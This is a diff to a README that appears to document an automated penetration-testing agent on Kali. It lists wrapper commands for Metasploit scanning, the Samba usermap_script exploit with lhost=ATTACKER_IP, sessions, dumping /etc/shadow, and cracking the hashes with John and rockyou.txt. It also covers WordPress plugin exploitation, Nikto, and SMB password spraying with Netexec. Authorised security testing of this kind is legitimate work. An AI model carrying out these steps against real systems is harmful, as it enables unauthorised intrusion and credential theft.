@@ -78,4 +78,47 @@ Proceed with the dump if an SQL injection is found
 
 ### 6) Metasploit (Port Scanning)
 
-    execute_command meta
+    execute_command metasploit_scan port scan on IP
+
+### 7) Metasploit (Use an exploit)
+
+    use Samba usermap_script (CVE-2007-2447) on port 445 lhost=ATTACKER_IP
+
+### 8) Metasploit (Sessions)
+
+    Sessions
+
+### 9) Crack hashes with John The Ripper
+
+Dump credentials (example)
+
+    dump /etc/shadow
+
+Crack with John
+
+    execute_command john_crack on hashes using rockyou.txt file
+
+### 10) WordPress target
+
+    execute_command wp_scan http://IP/wordpress/
+
+Exploit a vulnerable plugin
+
+    exploit PLUGIN_NAME
+
+### 11) Nikto
+
+    execute_command nikto_scan IP
+
+### 12) Health Check
+
+    health_check
+
+### 13) All available commands
+
+    help
+
+### 14) Use Netexec to test via SMB
+
+    execute_command nxc to test smb authentication on IP with the usernames listed in users.txt and the passwords listed in passwords.txt both stored on the Kali system.
+
